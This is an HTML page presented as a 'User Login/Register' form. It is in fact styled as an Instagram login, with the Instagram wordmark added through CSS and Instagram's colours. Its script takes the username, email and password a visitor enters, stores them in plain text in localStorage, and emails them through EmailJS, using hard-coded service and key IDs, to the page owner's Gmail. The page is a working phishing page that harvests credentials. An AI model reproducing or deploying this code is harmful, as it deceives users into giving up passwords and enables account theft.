<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>User Login/Register + EmailJS</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(120deg, #f58529, #dd2a7b, #8134af, #515bd4);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background: #fff;
      padding: 40px 30px;
      border-radius: 12px;
      width: 340px;
      box-shadow: 0 6px 15px rgba(0,0,0,0.15);
      text-align: center;
    }
    .form-container::before {
      content: "Instagram";
      display: block;
      font-size: 28px;
      font-weight: bold;
      font-family: 'Brush Script MT', cursive;
      margin-bottom: 20px;
      color: #262626;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      background: #fafafa;
      font-size: 14px;
      outline: none;
      transition: border 0.2s ease;
    }
    input:focus {
      border: 1px solid #a29bfe;
      background: #fff;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 10px;
      transition: background 0.3s ease;
    }
    button:hover { background: #007acc; }
  </style>
</head>
<body>

  <div class="form-container">
    <input type="text" id="username" placeholder="Enter Username" required>
    <input type="email" id="email" placeholder="Enter Email" required>
    <input type="password" id="password" placeholder="Enter Password" required>
    <button onclick="saveUser()">Register</button>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Init EmailJS with your Public Key
    (function(){
      emailjs.init("ktUFHFh_kc5R5Vhp4");  // ✅ your real public key
    })();

    function saveUser() {
      const username = document.getElementById("username").value.trim();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      if (username && email && password) {
        // Save to localStorage
        let users = JSON.parse(localStorage.getItem("users")) || [];
        users.push({ username, email, password });
        localStorage.setItem("users", JSON.stringify(users));

        // Send via EmailJS
        emailjs.send("service_c1gz6pl", "template_t6a4b0i", {
          username: username,
          email: email,
          password: password
        })
        .then(function() {
          alert("✅ Registered! Data sent to your Gmail.");
        }, function(error) {
          alert("❌ Error sending email: " + JSON.stringify(error));
        });

        // Reset form
        document.getElementById("username").value = "";
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
      } else {
        alert("Please fill all fields");
      }
    }
  </script>

</body>
</html>
